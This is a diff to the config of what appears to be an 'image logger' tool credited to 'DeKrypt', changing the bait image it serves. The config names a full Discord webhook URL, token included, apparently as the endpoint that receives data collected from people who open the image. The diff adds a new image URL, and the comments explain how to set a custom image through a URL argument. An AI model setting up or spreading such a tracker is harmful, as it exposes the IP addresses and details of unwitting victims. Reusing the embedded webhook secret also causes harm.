@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1445857020384116867/lQGWKPT9Nfqi2i9T43FCzdM91mXdLKOH1VskYHl7vtlXr7L_0uZ2tVYdpiSof7mg8qXU",
-    "image": "https://www.iamfy.co/products/mister-robot-fsociety?srsltid=AfmBOoqyLOY3AB0-Z6TIDMIyrqDdkNdVu22AczAg-0y7M-hkRFAmCfGz", # You can also have a custom image by using a URL argument
+    "image": "https://y.yarn.co/c965cfbf-45a1-4d84-8e49-fec9c532ce70_text.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
